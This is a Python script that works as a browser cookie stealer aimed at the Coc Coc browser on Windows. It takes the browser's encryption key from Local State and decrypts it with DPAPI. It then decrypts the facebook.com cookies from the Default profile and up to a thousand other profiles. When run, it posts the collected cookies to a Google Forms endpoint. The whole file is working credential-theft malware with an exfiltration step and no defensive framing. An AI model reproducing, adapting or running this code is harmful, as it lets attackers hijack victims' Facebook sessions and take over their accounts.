import os
import base64
import sqlite3
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome
import json
import requests
def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def get_encryption_key():
    local_state_path = None
    try:
	    local_state_path = os.path.join(os.environ["USERPROFILE"],
	                                        "AppData", "Local", "CocCoc", "Browser",
	                                        "User Data", "Local State")
	    if local_state_path != None:
	        with open(local_state_path, "r", encoding="utf-8") as f:
	            local_state = f.read()
	            local_state = json.loads(local_state)
	        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	        key = key[5:]
	        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
	    return None
    except:
        return None 
def craw_cookie():
	list_cookie = ""
	conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Default\\Network\\Cookies")
	conn.text_factory = lambda b: b.decode(errors = 'ignore')
	list_cookie+=read_cookie_from_sqlite(conn)+"\n##########\n"
	for i in range(0,1000):
		try:
			conn = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\CocCoc\\Browser\\User Data\\Profile "+str(i)+"\\Network\\Cookies")
			conn.text_factory = lambda b: b.decode(errors = 'ignore')
			cookie = read_cookie_from_sqlite(conn)+"\n##########\n"
			list_cookie+=cookie
		except:
			pass
	return list_cookie  
def read_cookie_from_sqlite(conn):
	list_cookie = ""
	if conn != None:
		with conn:
			cur = conn.cursor()
			cur.execute("SELECT host_key,name,encrypted_value FROM Cookies WHERE host_key LIKE '%facebook.com%' ORDER BY host_key")
			key = get_encryption_key()
			if key != None:
				for i in cur.fetchall():
					decrypted_value = decrypt_data(i[2], key)
					list_cookie += i[1]+"="+decrypted_value+";" #
				return list_cookie

def send_cookie(cookie):
	url = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdmtqX-H4Mqv3EvWN55yTKjOtu4tmJm_e-P_YaL9t-znKEYzw/formResponse'
	data = {
		'entry.1111466795': cookie
	}
	requests.post(url,data=data)

send_cookie(craw_cookie())	                 
